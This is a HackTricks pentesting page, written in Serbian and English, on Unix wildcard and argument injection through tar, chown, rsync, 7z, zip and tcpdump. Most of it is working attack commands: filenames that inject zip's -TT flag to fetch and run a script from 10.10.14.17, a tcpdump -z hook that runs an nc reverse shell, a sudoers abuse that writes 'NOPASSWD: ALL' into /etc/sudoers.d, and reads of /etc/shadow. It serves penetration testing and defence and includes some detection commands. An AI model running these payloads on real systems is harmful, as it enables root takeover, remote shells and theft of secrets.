# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** se dešava kada privilegovani skript pokreće Unix binary kao što je `tar`, `chown`, `rsync`, `zip`, `7z`, … sa nequoted wildcard-om poput `*`.
> Pošto shell proširuje wildcard **pre** izvršavanja binary-ja, napadač koji može da kreira fajlove u working directory-ju može da napravi filenames koji počinju sa `-` tako da se interpretiraju kao **options umesto data**, što efektivno omogućava ubacivanje arbitrary flags ili čak commands.
> Ova stranica okuplja najkorisnije primitives, recent research i modern detections za 2023-2025.

## chown / chmod

Možete **kopirati owner/group ili permission bits arbitrary fajla** zloupotrebom `--reference` flag-a:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Kada root kasnije izvrši nešto poput:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` je injected, što uzrokuje da *sve* odgovarajuće datoteke naslede vlasništvo/dozvole od `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
Pogledaj i klasični DefenseCode papir za detalje.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Izvrši proizvoljne komande zloupotrebom **checkpoint** funkcije:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Jednom kada root pokrene npr. `tar -czf /root/backup.tgz *`, `shell.sh` se izvršava kao root.

### bsdtar / macOS 14+

Podrazumevani `tar` na novijem macOS-u (zasnovan na `libarchive`) ne implementira `--checkpoint`, ali i dalje možeš postići code-execution uz **--use-compress-program** flag, koji omogućava da navedeš eksterni kompresor.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Kada privilegovani skript pokrene `tar -cf backup.tar *`, biće pokrenut `/bin/sh`.

---

## rsync

`rsync` omogućava da override-uješ remote shell ili čak remote binary preko command-line flagova koji počinju sa `-e` ili `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Ako root kasnije arhivira direktorijum sa `rsync -az * backup:/srv/`, injektovana flag pokreće vaš shell na udaljenoj strani.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Čak i kada privilegovani skript *defanzivno* stavlja prefiks `--` ispred wildcard-a (da zaustavi parsiranje opcija), 7-Zip format podržava **file list files** tako što se ispred imena fajla stavlja `@`. Kombinovanje toga sa symlink-om omogućava da *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Ako root izvrši nešto poput:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip će pokušati da pročita `root.txt` (→ `/etc/shadow`) kao listu fajlova i prekinuće, **ispisuje sadržaj na stderr**.

Ovo preživljava `-- *` zato što 7-Zip CLI eksplicitno prihvata i obična imena fajlova i `@listfiles` kao pozicione ulaze, pa se literalno ime fajla kao što je `@root.txt` i dalje tretira na poseban način.

---

## zip

Postoje dve veoma praktične primitive kada aplikacija prosleđuje korisnički kontrolisana imena fajlova `zip`-u (ili preko wildcarda ili enumerisanjem imena bez `--`).

- RCE preko test hook-a: `-T` omogućava “test archive”, a `-TT <cmd>` zamenjuje tester proizvoljnim programom (dugi oblik: `--unzip-command <cmd>`). Ako možeš da ubaciš imena fajlova koja počinju sa `-`, podeli flagove preko zasebnih imena fajlova tako da parsing short-options radi:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- Ne pokušavaj jedan jedini filename kao `'-T -TT <cmd>'` — kratke opcije se parsiraju po karakteru i to će failovati. Koristi odvojene tokene kao što je prikazano.
- Ako app uklanja slashes iz filenames, fetchuj sa bare host/IP (default path `/index.html`) i sačuvaj lokalno sa `-O`, pa zatim execute.
- Možeš da debuguješ parsing sa `-sc` (show processed argv) ili `-h2` (more help) da razumeš kako se tvoji tokeni consume-uju.

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Ako web layer vraća `zip` stdout/stderr (što je čest slučaj kod naivnih wrappera), injektovani flagovi kao što su `--help` ili greške zbog loših opcija će se pojaviti u HTTP response-u, potvrđujući command-line injection i pomažući u podešavanju payload-a.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Sledeće komande su zloupotrebljavane u modernim CTF-ovima i realnim okruženjima. Payload se uvek kreira kao *filename* unutar writable direktorijuma koji će kasnije biti obrađen wildcard-om:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Ovi primitive su ređi od klasičnih *tar/rsync/zip*, ali vredi ih proveriti pri hunting-u.

---

## Hunting vulnerable wrappers and jobs

Noviji case studies su pokazali da wildcard/argv injection više nije samo **cron + tar** problem. Ista klasa buga se stalno pojavljuje u:

- web features koje "download everything as zip/tar" iz upload direktorijuma pod kontrolom napadača
- vendor/appliance debug shells koji izlažu **tcpdump** wrapper sa poljima za filename/filter pod kontrolom napadača
- backup ili rotation jobs koji pozivaju `tar`, `rsync`, `7z`, `zip`, `chown`, ili `chmod` nad writable direktorijumima

Korisne triage komande:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Brze heuristike:

- `-- *` je dobro rešenje za mnoge GNU alate, ali **ne** za `7z`/`7za` zato što se `@listfiles` parsira odvojeno.
- Za `zip`, traži wrappers koji direktno nabrajaju filenames pod kontrolom korisnika; deljenje kratkih opcija (`-T` + `-TT <cmd>`) i dalje radi čak i bez shell glob.
- Za `tcpdump`, obrati posebnu pažnju na wrappers koji ti dopuštaju da kontrolišeš **output file names**, **rotation settings**, ili argumente za **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Kada restricted shell ili vendor wrapper pravi `tcpdump` command line konkatenacijom polja pod kontrolom korisnika (npr. parametra "file name") bez strogog quoting/validation, možeš da ubaciš dodatne `tcpdump` flagove. Kombinacija `-G` (time-based rotation), `-W` (limit number of files), i `-z <cmd>` (post-rotate command) daje arbitrary command execution kao user koji pokreće tcpdump (često root na uređajima).

Preconditions:

- Možeš da utičeš na `argv` koji se prosleđuje `tcpdump`-u (npr. preko wrappera kao `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper ne sanitizuje razmake niti `-`-prefiksirane tokene u polju za file name.

Classic PoC (executes a reverse shell script from a writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` forsira momentalnu rotaciju nakon prvog matching paketa.
- `-z <cmd>` pokreće post-rotate komandu jednom po rotaciji. Mnogi buildovi izvršavaju `<cmd> <savefile>`. Ako je `<cmd>` script/interpreter, obezbedite da rukovanje argumentima odgovara vašem payload-u.

No-removable-media varijante:

- Ako imate bilo koji drugi primitive za pisanje fajlova (npr. poseban command wrapper koji omogućava output redirection), ubacite svoj script u poznatu putanju i okinite `-z /bin/sh /path/script.sh` ili `-z /path/script.sh` u zavisnosti od platform semantics.
- Neki vendor wrapperi rotiraju na lokacije koje napadač može da kontroliše. Ako možete da utičete na rotated path (symlink/directory traversal), možete naterati `-z` da izvrši sadržaj koji potpuno kontrolišete bez eksternog media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Vrlo čest sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Problemi
- `*` glob i permissive obrasci ograničavaju samo prvi `-w` argument. `tcpdump` prihvata više `-w` opcija; poslednja važi.
- Pravilo ne pinuje druge opcije, pa su `-Z`, `-r`, `-V`, itd. dozvoljene.

Primitives
- Override destination path sa drugim `-w` (prvi samo zadovoljava sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal unutar prvog `-w` da se izađe iz ograničenog stabla:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Forsiraj ownership izlaza sa `-Z root` (kreira fajlove u vlasništvu root-a bilo gde):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Arbitrary-content write by replaying a crafted PCAP via `-r` (e.g., to drop a sudoers line):

<details>
<summary>Create a PCAP that contains the exact ASCII payload and write it as root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (interprets a list of savefiles). Error diagnostics often echo lines, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Reference

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
